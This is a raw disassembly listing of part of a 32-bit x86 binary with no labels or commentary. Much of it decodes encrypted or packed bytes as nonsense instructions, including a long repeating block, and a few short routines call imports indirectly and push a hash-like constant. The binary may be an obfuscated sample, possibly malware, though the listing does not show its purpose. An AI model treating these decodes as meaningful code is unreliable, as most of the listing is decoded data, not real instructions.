  422ced:	mov    eax,ds:0x5eeeab28
  422cf2:	xchg   ecx,eax
  422cf3:	sbb    BYTE PTR [edx],dh
  422cf5:	sti    
  422cf6:	push   esi
  422cf7:	jmp    0x422d62
  422cf9:	or     dh,BYTE PTR [eax+0x61e0056a]
  422cff:	(bad)  
  422d00:	jae    0x422cc4
  422d02:	lods   eax,DWORD PTR ds:[si]
  422d04:	push   eax
  422d05:	sub    DWORD PTR [ecx],ecx
  422d07:	jmp    0x6dfc:0xda37ed1c
  422d0e:	ss cli 
  422d10:	les    ecx,FWORD PTR [eax]
  422d12:	xor    DWORD PTR [edx-0x796e6699],esp
  422d18:	jnp    0x422d59
  422d1a:	(bad)
  422d1e:	lods   eax,DWORD PTR ds:[esi]
  422d20:	icebp  
  422d21:	jge    0x422d02
  422d23:	int    0xf5
  422d25:	loopne 0x422d94
  422d27:	(bad)  
  422d28:	inc    ebp
  422d29:	pop    eax
  422d2a:	pop    ecx
  422d2b:	fst    DWORD PTR [edi+0x43c13f3]
  422d31:	jno    0x422d12
  422d33:	test   edx,edx
  422d35:	add    edx,DWORD PTR [edi+0x7f]
  422d38:	nop
  422d39:	dec    edi
  422d3a:	das    
  422d3b:	rol    bh,1
  422d3d:	sub    bh,BYTE PTR [eax-0x46da723]
  422d43:	cmp    ebx,ecx
  422d45:	push   0xe223ec66
  422d4a:	enter  0xd24c,0x6f
  422d4e:	jge    0x422d29
  422d50:	mov    al,ds:0x832c1204
  422d55:	loope  0x422cdf
  422d57:	jle    0x422ce4
  422d59:	push   esp
  422d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d5b:	jge    0x422d18
  422d5d:	lds    eax,FWORD PTR [esp+ebx*8+0x3689247b]
  422d64:	sbb    al,BYTE PTR [ebx-0x3f]
  422d67:	jl     0x422db3
  422d69:	repnz inc esp
  422d6b:	inc    ebp
  422d6c:	scas   eax,DWORD PTR es:[edi]
  422d6d:	jns    0x422d8c
  422d6f:	in     eax,0xef
  422d71:	nop
  422d72:	push   ecx
  422d73:	lds    ebp,FWORD PTR [edi+0x50118962]
  422d79:	aaa    
  422d7a:	adc    BYTE PTR [esi-0x57],0xd0
  422d7e:	adc    al,0x21
  422d80:	call   0xdd3e:0x4ed76d13
  422d87:	loope  0x422e03
  422d89:	shl    BYTE PTR [edi],0xa2
  422d8c:	mov    dh,0x24
  422d8e:	sub    eax,0x352e732b
  422d93:	push   0xffffff8d
  422d95:	std    
  422d96:	test   eax,0xae466970
  422d9b:	mov    al,0x27
  422d9d:	call   0x953d:0xdd3f7886
  422da4:	stos   DWORD PTR es:[edi],eax
  422da5:	ficomp DWORD PTR [edx-0x75]
  422da8:	bound  ebx,QWORD PTR [esi]
  422daa:	outs   dx,BYTE PTR ds:[esi]
  422dab:	ds (bad) 
  422dad:	mov    edx,0xb4a5f93d
  422db2:	push   esi
  422db3:	push   ss
  422db4:	into   
  422db5:	push   esi
  422db6:	test   eax,0xe57a0a62
  422dbb:	sub    al,0x13
  422dbd:	inc    ecx
  422dbe:	inc    esi
  422dbf:	mov    BYTE PTR [ebp-0x5b792654],ah
  422dc5:	push   edx
  422dc6:	push   edx
  422dc7:	(bad)  
  422dc8:	fisubr WORD PTR [ebx]
  422dca:	lahf   
  422dcb:	sub    eax,0x9baa1860
  422dd0:	xchg   edi,eax
  422dd1:	rcl    DWORD PTR [edi],0x79
  422dd4:	xchg   esi,eax
  422dd5:	icebp  
  422dd6:	pop    edi
  422dd7:	sub    esp,DWORD PTR [edx+edx*4+0x6f]
  422ddb:	jnp    0x422df0
  422ddd:	xchg   esp,eax
  422dde:	call   0xb3ce919e
  422de3:	fadd   DWORD PTR [esp+eiz*4-0x65e10590]
  422dea:	ins    DWORD PTR es:[edi],dx
  422deb:	jmp    0x422db8
  422ded:	adc    DWORD PTR [ebp+eiz*8+0x359cf428],ecx
  422df4:	mov    dh,0x5d
  422df6:	hlt    
  422df7:	cmp    BYTE PTR [ebx-0x15e0a911],bh
  422dfd:	jno    0x422e2d
  422dff:	es into 
  422e01:	xchg   ebx,eax
  422e02:	in     eax,0x5d
  422e04:	xchg   edi,eax
  422e05:	cmp    DWORD PTR [ebx],edx
  422e07:	push   ds
  422e08:	ss div cl
  422e0b:	dec    eax
  422e0c:	fs ds cdq 
  422e0f:	push   ebp
  422e10:	sub    eax,0xd60b531c
  422e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e16:	into   
  422e17:	push   es
  422e18:	mov    ebp,0x9c0556a3
  422e1d:	add    eax,0xc80b3ab7
  422e22:	mov    bl,0x93
  422e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e25:	sahf   
  422e26:	pop    ebx
  422e27:	and    BYTE PTR [edx+0x61],cl
  422e2a:	mov    cl,0xbd
  422e2c:	dec    esi
  422e2d:	imul   edx,ebp,0xfffffffa
  422e30:	into   
  422e31:	std    
  422e32:	mov    ds:0xabcf4f77,al
  422e37:	jp     0x422e89
  422e39:	stos   DWORD PTR es:[edi],eax
  422e3a:	mov    ebx,0xf716e00b
  422e3f:	imul   ebx,DWORD PTR [edx+ebp*2-0x25],0xffffffc8
  422e44:	fsub   DWORD PTR ds:0x12156595
  422e4a:	cmc    
  422e4b:	nop
  422e4c:	mov    eax,0xe7681be9
  422e51:	into   
  422e52:	ins    BYTE PTR es:[edi],dx
  422e53:	ror    ebx,1
  422e55:	stc    
  422e56:	std    
  422e57:	or     eax,0xc8adde74
  422e5c:	retf   0x4236
  422e5f:	xor    al,0x88
  422e61:	imul   esi,DWORD PTR [ecx],0x4fec0040
  422e67:	sahf   
  422e68:	adc    eax,0xc63727ae
  422e6d:	push   es
  422e6e:	fnstcw WORD PTR [edi]
  422e70:	aad    0xb
  422e72:	int3   
  422e73:	push   ecx
  422e74:	not    eax
  422e76:	outs   dx,BYTE PTR ds:[esi]
  422e77:	imul   ebp,DWORD PTR [ecx-0x7d],0x36
  422e7b:	popf   
  422e7c:	mov    dl,0x10
  422e7e:	stos   DWORD PTR es:[edi],eax
  422e7f:	jmp    0x51a434ad
  422e84:	fild   QWORD PTR [ebp-0x346cf0ab]
  422e8a:	mov    ds:0x2e3b9e15,eax
  422e8f:	jne    0x422ee1
  422e91:	out    0x66,eax
  422e93:	fisubr DWORD PTR [edx+edi*2+0x1384cd9]
  422e9a:	out    dx,al
  422e9b:	es (bad) 
  422e9d:	ss add al,0xb6
  422ea0:	pop    ebp
  422ea1:	aas    
  422ea2:	cld    
  422ea3:	(bad)  
  422ea4:	int3   
  422ea5:	xor    al,0xb0
  422ea7:	dec    edx
  422ea8:	xor    BYTE PTR [ecx-0x75],al
  422eab:	xor    al,0x63
  422ead:	test   edx,0xbf794d9e
  422eb3:	inc    esp
  422eb4:	dec    esp
  422eb5:	int3   
  422eb6:	inc    edx
  422eb7:	repz shl BYTE PTR [ebx],0xe
  422ebb:	add    dl,dl
  422ebd:	sub    eax,0x43558585
  422ec2:	lea    edx,[ebp+0x36]
  422ec5:	adc    eax,0x172e244d
  422eca:	xlat   BYTE PTR ss:[ebx]
  422ecc:	enter  0x6367,0x92
  422ed0:	pop    ecx
  422ed1:	dec    esp
  422ed2:	je     0x422e61
  422ed4:	push   edx
  422ed5:	into   
  422ed6:	jnp    0x422f00
  422ed8:	in     al,dx
  422ed9:	imul   ecx,DWORD PTR [eax-0x3c2bcfaa],0xbc2936b7
  422ee3:	je     0x422ea0
  422ee5:	push   ds
  422ee6:	xlat   BYTE PTR ds:[ebx]
  422ee7:	ds test eax,0xc402bb9e
  422eed:	arpl   bp,bx
  422eef:	hlt    
  422ef0:	sub    al,0x0
  422ef2:	lods   eax,DWORD PTR ds:[esi]
  422ef3:	shl    bh,0x2a
  422ef6:	sar    BYTE PTR [eax+edi*4-0x5d],cl
  422efa:	xor    esi,DWORD PTR [ecx-0x52b97dfe]
  422f00:	je     0x422ef8
  422f02:	out    0x20,eax
  422f04:	adc    al,0x4c
  422f06:	jnp    0x422f43
  422f08:	xor    al,0xff
  422f0a:	push   ebp
  422f0b:	repnz and al,0xb
  422f0e:	cld    
  422f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f10:	loop   0x422ea2
  422f12:	dec    esi
  422f13:	push   cs
  422f14:	cli    
  422f15:	and    ch,bl
  422f17:	aad    0xab
  422f19:	xor    BYTE PTR ds:0x48f19f55,al
  422f1f:	cld    
  422f20:	xor    bl,BYTE PTR [esi+0x21500bf5]
  422f26:	sub    eax,DWORD PTR [edi+0x52]
  422f29:	mov    eax,0x1
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0x850eb4ec
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	jmp    FWORD PTR [edx+0x4c13e116]
  422fd8:	mov    dh,0x56
  422fda:	hlt    
  422fdb:	(bad)  
  422fdc:	adc    BYTE PTR [eax+0x6c],bh
  422fdf:	stos   DWORD PTR es:[edi],eax
  422fe0:	sbb    BYTE PTR [ecx+esi*2-0x55],cl
  422fe4:	dec    edi
  422fe5:	mov    dh,0x56
  422fe7:	hlt    
  422fe8:	cli    
  422fe9:	adc    BYTE PTR [eax+0x2c],bh
  422fec:	push   esp
  422fed:	out    0x4c,eax
  422fef:	jno    0x423004
  422ff1:	dec    edi
  422ff2:	mov    dh,0x56
  422ff4:	hlt    
  422ff5:	cli    
  422ff6:	adc    BYTE PTR [eax+0x6c],bh
  422ff9:	push   esp
  422ffa:	out    0x4c,eax
  422ffc:	jno    0x423011
  422ffe:	dec    edi
  422fff:	mov    dh,0x56
  423001:	hlt    
  423002:	cli    
  423003:	adc    BYTE PTR [eax+0x6c],bh
  423006:	push   esp
  423007:	out    0x4c,eax
  423009:	jno    0x42301e
  42300b:	dec    edi
  42300c:	mov    dh,0x56
  42300e:	hlt    
  42300f:	add    dl,BYTE PTR [eax]
  423011:	js     0x42307f
  423013:	pop    edx
  423014:	clc    
  423015:	idiv   BYTE PTR [edi+0x13]
  423018:	sti    
  423019:	mov    edi,0x1142d59b
  42301e:	xor    al,0xa1
  423020:	jne    0x422fd5
  423022:	and    al,0x18
  423024:	pusha  
  423025:	outs   dx,DWORD PTR ds:[esi]
  423026:	(bad)  
  423027:	and    al,0x9b
  423029:	popf   
  42302a:	bound  ebx,QWORD PTR [ecx]
  42302c:	add    DWORD PTR [esp+eax*4+0x2d],esi
  423030:	pop    ds
  423031:	jge    0x423053
  423033:	ret    0x9676
  423036:	lahf   
  423037:	xor    BYTE PTR [edx],cl
  423039:	sbb    DWORD PTR [edx],edi
  42303b:	(bad)  
  42303c:	and    eax,0xf90b331f
  423041:	add    eax,0x1c7f97d4
  423046:	or     DWORD PTR [edx-0x16],edi
  423049:	inc    ecx
  42304a:	jnp    0x423083
  42304c:	dec    edi
  42304d:	mov    dh,0x56
  42304f:	hlt    
  423050:	cli    
  423051:	adc    BYTE PTR [eax+0x6b],bh
  423054:	int    0x1b
  423056:	adc    eax,0xbcddeb32
  42305b:	adc    eax,0x3b1a680c
  423060:	xchg   esp,eax
  423061:	(bad)  
  423062:	in     eax,dx
  423063:	adc    al,0x14
  423065:	pop    ds
  423066:	inc    ebp
  423067:	jmp    0x4932971a
  42306c:	sbb    eax,0xb4255e54
  423071:	jecxz  0x42308c
  423073:	pop    ss
  423074:	shr    DWORD PTR [edi-0x2],cl
  423077:	xchg   edx,eax
  423078:	call   0x69ba9767
  42307d:	jne    0x4230fa
  42307f:	push   ebp
  423080:	mov    bh,0x24
  423082:	pop    esp
  423083:	mov    esi,0x2672017a
  423088:	lods   al,BYTE PTR ds:[esi]
  423089:	jne    0x4230d1
  42308b:	cmp    edx,DWORD PTR [ebx+0xc0ebc4e]
  423091:	push   0xc7943b1a
  423096:	in     eax,dx
  423097:	mov    BYTE PTR fs:[ecx+0x748e0945],al
  42309e:	lock pop ebp
  4230a0:	cmp    dh,0x5e
  4230a3:	mov    edi,0x47194c29
  4230a8:	dec    esi
  4230a9:	(bad)  
  4230aa:	(bad)  
  4230ab:	mov    ds:0x16667075,al
  4230b0:	pop    ds
  4230b1:	fidivr WORD PTR [ebx+0x4b]
  4230b4:	sub    bh,BYTE PTR [ecx-0x7dfd49a4]
  4230ba:	jb     0x4230fa
  4230bc:	cmp    eax,0xeb322484
  4230c1:	fnstsw WORD PTR [esi+edx*2+0x7810faf4]
  4230c8:	ins    BYTE PTR es:[edi],dx
  4230c9:	push   esp
  4230ca:	out    0x1c,eax
  4230cc:	xor    al,0x13
  4230ce:	dec    edi
  4230cf:	cli    
  4230d0:	push   edi
  4230d1:	idiv   dl
  4230d3:	cld    
  4230d4:	fwait
  4230d5:	xor    ebx,DWORD PTR [ebx]
  4230d7:	out    0x4c,eax
  4230d9:	jno    0x4230ee
  4230db:	dec    edi
  4230dc:	mov    dh,0x56
  4230de:	hlt    
  4230df:	sbb    dl,BYTE PTR [eax]
  4230e1:	jnp    0x423150
  4230e3:	pop    edi
  4230e4:	out    0x46,al
  4230e6:	jno    0x4230fb
  4230e8:	mov    ds:0xfef456b2,eax
  4230ed:	push   ss
  4230ee:	js     0x42315c
  4230f0:	push   esp
  4230f1:	out    0x4c,eax
  4230f3:	jo     0x4230a3
  4230f5:	dec    edi
  4230f6:	mov    dh,0x56
  4230f8:	in     al,0xfa
  4230fa:	adc    BYTE PTR [eax+0x6c],bh
  4230fd:	push   ecx
  4230fe:	out    0x4c,eax
  423100:	jno    0x423154
  423102:	dec    edi
  423103:	mov    dh,0x46
  423105:	hlt    
  423106:	cli    
  423107:	adc    BYTE PTR [edx+0x6c],bh
  42310a:	push   esp
  42310b:	loop   0x423159
  42310d:	jo     0x423122
  42310f:	dec    edi
  423110:	mov    dh,0x56
  423112:	hlt    
  423113:	call   DWORD PTR [eax]
  423115:	jns    0x423183
  423117:	push   esp
  423118:	out    0x4c,eax
  42311a:	jno    0x42312f
  42311c:	iret   
  42311d:	mov    ebp,0x10fef456
  423122:	js     0x4230f5
  423124:	gs loop 0x423173
  423127:	jae    0x42313c
  423129:	dec    edi
  42312a:	ss push esi
  42312c:	hlt    
  42312d:	jmp    0x4ce7:0x547c7810
  423134:	jno    0x423139
  423136:	dec    edi
  423137:	mov    dh,0x46
  423139:	hlt    
  42313a:	cli    
  42313b:	adc    BYTE PTR [eax+0x6c],bh
  42313e:	push   esp
  42313f:	test   DWORD PTR [ecx+esi*2+0x13],0xf456b64f
  423147:	cli    
  423148:	adc    BYTE PTR [eax+0x6c],bh
  42314b:	ror    BYTE PTR [ecx+0x4c7a7147],1
  423151:	mov    dh,0x56
  423153:	hlt    
  423154:	retf   0x781b
  423157:	mov    ds:0x714ce769,eax
  42315c:	adc    ecx,DWORD PTR [edi-0x4a]
  42315f:	push   esi
  423160:	hlt    
  423161:	cli    
  423162:	adc    BYTE PTR [eax+0x6c],bh
  423165:	push   esp
  423166:	out    0x4c,eax
  423168:	jno    0x42317d
  42316a:	dec    edi
  42316b:	mov    dh,0x56
  42316d:	hlt    
  42316e:	cli    
  42316f:	adc    BYTE PTR [eax+0x6c],bh
  423172:	push   esp
  423173:	out    0x4c,eax
  423175:	jno    0x42318a
  423177:	dec    edi
  423178:	mov    dh,0x56
  42317a:	hlt    
  42317b:	cli    
  42317c:	adc    BYTE PTR [eax+0x6c],bh
  42317f:	push   esp
  423180:	out    0x4c,eax
  423182:	jno    0x423197
  423184:	dec    edi
  423185:	mov    dh,0x56
  423187:	hlt    
  423188:	cli    
  423189:	adc    BYTE PTR [eax+0x6c],bh
  42318c:	push   esp
  42318d:	out    0x4c,eax
  42318f:	jno    0x4231a4
  423191:	dec    edi
  423192:	mov    dh,0x56
  423194:	hlt    
  423195:	cli    
  423196:	adc    BYTE PTR [eax+0x6c],bh
  423199:	push   esp
  42319a:	out    0x4c,eax
  42319c:	jno    0x4231b1
  42319e:	dec    edi
  42319f:	mov    dh,0x56
  4231a1:	hlt    
  4231a2:	cli    
  4231a3:	adc    BYTE PTR [eax+0x6c],bh
  4231a6:	push   esp
  4231a7:	out    0x4c,eax
  4231a9:	jno    0x4231be
  4231ab:	dec    edi
  4231ac:	mov    dh,0x56
  4231ae:	hlt    
  4231af:	cli    
  4231b0:	adc    BYTE PTR [eax+0x6c],bh
  4231b3:	push   esp
  4231b4:	out    0x4c,eax
  4231b6:	jno    0x4231cb
  4231b8:	dec    edi
  4231b9:	mov    dh,0x56
  4231bb:	hlt    
  4231bc:	cli    
  4231bd:	adc    BYTE PTR [eax+0x6c],bh
  4231c0:	push   esp
  4231c1:	out    0x4c,eax
  4231c3:	pop    edi
  4231c4:	addr16 sub cl,dh
  4231c7:	and    dh,ah
  4231c9:	cli    
  4231ca:	adc    BYTE PTR [eax+0x4c],bh
  4231cd:	pop    edi
  4231ce:	out    0x4c,eax
  4231d0:	popa   
  4231d1:	adc    ecx,DWORD PTR [edi-0x4a]
  4231d4:	ins    BYTE PTR es:[edi],dx
  4231d5:	lock cli 
  4231d7:	adc    BYTE PTR [esp+ebp*2+0x54],bh
  4231db:	mov    bh,0x9
  4231dd:	xor    ah,BYTE PTR [ecx]
  4231df:	sbb    edi,ecx
  4231e1:	push   esi
  4231e2:	hlt    
  4231e3:	cli    
  4231e4:	adc    BYTE PTR [eax+0x6c],bh
  4231e7:	je     0x4231d0
  4231e9:	dec    esp
  4231ea:	xchg   ecx,eax
  4231eb:	cmp    eax,0x9724c53d
  4231f0:	cli    
  4231f1:	adc    BYTE PTR [eax+0x6c],bh
  4231f4:	add    al,0xe7
  4231f6:	dec    esp
  4231f7:	jno    0x42321c
  4231f9:	inc    esp
  4231fa:	mov    dh,0x56
  4231fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231fd:	cli    
  4231fe:	adc    BYTE PTR [eax+0x52],bh
  423201:	push   eax
  423202:	out    0x4c,eax
  423204:	jno    0x423219
  423206:	dec    edi
  423207:	mov    dh,0x56
  423209:	hlt    
  42320a:	cli    
  42320b:	adc    BYTE PTR [eax+0x6c],bh
  42320e:	push   esp
  42320f:	(bad)  
  423210:	dec    esp
  423211:	jno    0x423206
  423213:	dec    edi
  423214:	mov    dh,0x56
  423216:	hlt    
  423217:	cli    
  423218:	adc    BYTE PTR [eax+0x6c],bh
  42321b:	push   esp
  42321c:	out    0x4c,eax
  42321e:	jno    0x423233
  423220:	dec    edi
  423221:	mov    dh,0x56
  423223:	hlt    
  423224:	cli    
  423225:	adc    BYTE PTR [eax+0x6c],bh
  423228:	push   esp
  423229:	out    0x4c,eax
  42322b:	jno    0x423240
  42322d:	dec    edi
  42322e:	mov    dh,0x56
  423230:	hlt    
  423231:	cli    
  423232:	adc    BYTE PTR [eax+0x6c],bh
  423235:	push   esp
  423236:	out    0x4c,eax
  423238:	jno    0x42324d
  42323a:	dec    edi
  42323b:	mov    dh,0x56
  42323d:	hlt    
  42323e:	cli    
  42323f:	adc    BYTE PTR [eax+0x6c],bh
  423242:	push   esp
  423243:	out    0x4c,eax
  423245:	jno    0x42325a
  423247:	dec    edi
  423248:	mov    dh,0x56
  42324a:	hlt    
  42324b:	cli    
  42324c:	adc    BYTE PTR [eax+0x6c],bh
  42324f:	push   esp
  423250:	out    0x4c,eax
  423252:	jno    0x423267
  423254:	dec    edi
  423255:	mov    dh,0x56
  423257:	hlt    
  423258:	cli    
  423259:	adc    BYTE PTR [eax+0x6c],bh
  42325c:	push   esp
  42325d:	out    0x4c,eax
  42325f:	jno    0x423274
  423261:	dec    edi
  423262:	mov    dh,0x56
  423264:	hlt    
  423265:	cli    
  423266:	adc    BYTE PTR [eax+0x6c],bh
  423269:	push   esp
  42326a:	out    0x4c,eax
  42326c:	jno    0x423281
  42326e:	dec    edi
  42326f:	mov    dh,0x56
  423271:	hlt    
  423272:	cli    
  423273:	adc    BYTE PTR [eax+0x6c],bh
  423276:	push   esp
  423277:	out    0x4c,eax
  423279:	jno    0x42328e
  42327b:	dec    edi
  42327c:	mov    dh,0x56
  42327e:	hlt    
  42327f:	cli    
  423280:	adc    BYTE PTR [eax+0x6c],bh
  423283:	push   esp
  423284:	out    0x4c,eax
  423286:	jno    0x42329b
  423288:	dec    edi
  423289:	mov    dh,0x56
  42328b:	hlt    
  42328c:	cli    
  42328d:	adc    BYTE PTR [eax+0x6c],bh
  423290:	push   esp
  423291:	out    0x4c,eax
  423293:	jno    0x4232a8
  423295:	dec    edi
  423296:	mov    dh,0x56
  423298:	hlt    
  423299:	cli    
  42329a:	adc    BYTE PTR [eax+0x6c],bh
  42329d:	push   esp
  42329e:	out    0x4c,eax
  4232a0:	jno    0x4232b5
  4232a2:	dec    edi
  4232a3:	mov    dh,0x56
  4232a5:	hlt    
  4232a6:	cli    
  4232a7:	adc    BYTE PTR [eax+0x6c],bh
  4232aa:	push   esp
  4232ab:	out    0x4c,eax
  4232ad:	jno    0x4232c2
  4232af:	dec    edi
  4232b0:	mov    dh,0x56
  4232b2:	hlt    
  4232b3:	cli    
  4232b4:	adc    BYTE PTR [eax+0x6c],bh
  4232b7:	push   esp
  4232b8:	out    0x4c,eax
  4232ba:	jno    0x4232cf
  4232bc:	dec    edi
  4232bd:	mov    dh,0x56
  4232bf:	hlt    
  4232c0:	cli    
  4232c1:	adc    BYTE PTR [eax+0x6c],bh
  4232c4:	push   esp
  4232c5:	out    0x4c,eax
  4232c7:	jno    0x4232dc
  4232c9:	dec    edi
  4232ca:	mov    dh,0x56
  4232cc:	hlt    
  4232cd:	cli    
  4232ce:	adc    BYTE PTR [eax+0x6c],bh
  4232d1:	push   esp
  4232d2:	out    0x4c,eax
  4232d4:	jno    0x4232e9
  4232d6:	dec    edi
  4232d7:	mov    dh,0x56
  4232d9:	hlt    
  4232da:	cli    
  4232db:	adc    BYTE PTR [eax+0x6c],bh
  4232de:	push   esp
  4232df:	out    0x4c,eax
  4232e1:	jno    0x4232f6
  4232e3:	dec    edi
  4232e4:	mov    dh,0x56
  4232e6:	hlt    
  4232e7:	cli    
  4232e8:	adc    BYTE PTR [eax+0x6c],bh
  4232eb:	push   esp
  4232ec:	out    0x4c,eax
  4232ee:	jno    0x423303
  4232f0:	dec    edi
  4232f1:	mov    dh,0x56
  4232f3:	hlt    
  4232f4:	cli    
  4232f5:	adc    BYTE PTR [eax+0x6c],bh
  4232f8:	push   esp
  4232f9:	out    0x4c,eax
  4232fb:	jno    0x423310
  4232fd:	dec    edi
  4232fe:	mov    dh,0x56
  423300:	hlt    
  423301:	cli    
  423302:	adc    BYTE PTR [eax+0x6c],bh
  423305:	push   esp
  423306:	out    0x4c,eax
  423308:	jno    0x42331d
  42330a:	dec    edi
  42330b:	mov    dh,0x56
  42330d:	hlt    
  42330e:	cli    
  42330f:	adc    BYTE PTR [eax+0x6c],bh
  423312:	push   esp
  423313:	out    0x4c,eax
  423315:	jno    0x42332a
  423317:	dec    edi
  423318:	mov    dh,0x56
  42331a:	hlt    
  42331b:	cli    
  42331c:	adc    BYTE PTR [eax+0x6c],bh
  42331f:	push   esp
  423320:	out    0x4c,eax
  423322:	jno    0x423337
  423324:	dec    edi
  423325:	mov    dh,0x56
  423327:	hlt    
  423328:	cli    
  423329:	adc    BYTE PTR [eax+0x6c],bh
  42332c:	push   esp
  42332d:	out    0x4c,eax
  42332f:	jno    0x423344
  423331:	dec    edi
  423332:	mov    dh,0x56
  423334:	hlt    
  423335:	cli    
  423336:	adc    BYTE PTR [eax+0x6c],bh
  423339:	push   esp
  42333a:	out    0x4c,eax
  42333c:	jno    0x423351
  42333e:	dec    edi
  42333f:	mov    dh,0x56
  423341:	hlt    
  423342:	cli    
  423343:	adc    BYTE PTR [eax+0x6c],bh
  423346:	push   esp
  423347:	out    0x4c,eax
  423349:	jno    0x42335e
  42334b:	dec    edi
  42334c:	mov    dh,0x56
  42334e:	hlt    
  42334f:	cli    
  423350:	adc    BYTE PTR [eax+0x6c],bh
  423353:	push   esp
  423354:	out    0x4c,eax
  423356:	jno    0x42336b
  423358:	dec    edi
  423359:	mov    dh,0x56
  42335b:	hlt    
  42335c:	cli    
  42335d:	adc    BYTE PTR [eax+0x6c],bh
  423360:	push   esp
  423361:	out    0x4c,eax
  423363:	jno    0x423378
  423365:	dec    edi
  423366:	mov    dh,0x56
  423368:	hlt    
  423369:	cli    
  42336a:	adc    BYTE PTR [eax+0x6c],bh
  42336d:	push   esp
  42336e:	out    0x4c,eax
  423370:	jno    0x423385
  423372:	dec    edi
  423373:	mov    dh,0x56
  423375:	hlt    
  423376:	cli    
  423377:	adc    BYTE PTR [eax+0x6c],bh
  42337a:	push   esp
  42337b:	out    0x4c,eax
  42337d:	jno    0x423392
  42337f:	dec    edi
  423380:	mov    dh,0x56
  423382:	hlt    
  423383:	cli    
  423384:	adc    BYTE PTR [eax+0x6c],bh
  423387:	push   esp
  423388:	out    0x4c,eax
  42338a:	jno    0x42339f
  42338c:	dec    edi
  42338d:	mov    dh,0x56
  42338f:	hlt    
  423390:	cli    
  423391:	adc    BYTE PTR [eax+0x6c],bh
  423394:	push   esp
  423395:	out    0x4c,eax
  423397:	jno    0x4233ac
  423399:	dec    edi
  42339a:	mov    dh,0x56
  42339c:	hlt    
  42339d:	cli    
  42339e:	adc    BYTE PTR [eax+0x6c],bh
  4233a1:	push   esp
  4233a2:	out    0x4c,eax
  4233a4:	jno    0x4233b9
  4233a6:	dec    edi
  4233a7:	mov    dh,0x56
  4233a9:	hlt    
  4233aa:	cli    
  4233ab:	adc    BYTE PTR [eax+0x6c],bh
  4233ae:	push   esp
  4233af:	out    0x4c,eax
  4233b1:	jno    0x4233c6
  4233b3:	dec    edi
  4233b4:	mov    dh,0x56
  4233b6:	hlt    
  4233b7:	cli    
  4233b8:	adc    BYTE PTR [eax+0x6c],bh
  4233bb:	push   esp
  4233bc:	out    0x4c,eax
  4233be:	jno    0x4233d3
  4233c0:	dec    edi
  4233c1:	mov    dh,0x56
  4233c3:	hlt    
  4233c4:	cli    
  4233c5:	adc    BYTE PTR [eax+0x6c],bh
  4233c8:	push   esp
  4233c9:	out    0x4c,eax
  4233cb:	jno    0x4233e0
  4233cd:	dec    edi
  4233ce:	mov    dh,0x56
  4233d0:	hlt    
  4233d1:	cli    
  4233d2:	adc    BYTE PTR [edi],bh
  4233d4:	sbb    BYTE PTR [esi-0x19],0x63
  4233d8:	jno    0x4233ed
  4233da:	pop    edi
  4233db:	mov    dh,0x56
  4233dd:	ficomp WORD PTR [eax-0x36]
  4233e0:	or     DWORD PTR [edx],ecx
  4233e2:	stos   DWORD PTR es:[edi],eax
  4233e3:	retf   0xf6d2
  4233e6:	inc    ebx
  4233e7:	mov    ds:0x4ee7be80,al
  4233ec:	test   DWORD PTR [esi],ebx
  4233ee:	sbb    eax,0xc05fbdd0
  4233f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233f4:	pop    ecx
  4233f5:	(bad)  [edx+0x56d67b7e]
  4233fb:	push   cs
  4233fc:	(bad)  
  4233fd:	fdiv   DWORD PTR [ebp+0x42]
  423400:	pop    esp
  423401:	(bad)  
  423402:	mov    eax,ds:0xb7ddf474
  423407:	lock cmp DWORD PTR ds:0x2e43e58a,eax
  42340e:	xchg   edx,eax
  42340f:	mov    ds:0x4bea94e7,al
  423414:	pop    esi
  423415:	jge    0x4233d2
  423417:	mov    gs,ebp
  423419:	sbb    eax,0x919af5f4
  42341e:	jns    0x4233ce
  423420:	out    dx,al
  423421:	dec    esi
  423422:	sbb    al,0x99
  423424:	jle    0x423474
  423426:	rcr    edx,1
  423428:	dec    ebx
  423429:	and    DWORD PTR [edi],ebp
  42342b:	retf   
  42342c:	out    0x65,al
  42342e:	gs (bad) 
  423431:	xor    bh,dl
  423433:	test   eax,0x1fba0554
  423438:	stc    
  423439:	xchg   esi,eax
  42343a:	stos   BYTE PTR es:[edi],al
  42343b:	repnz popa 
  42343d:	sbb    al,0x19
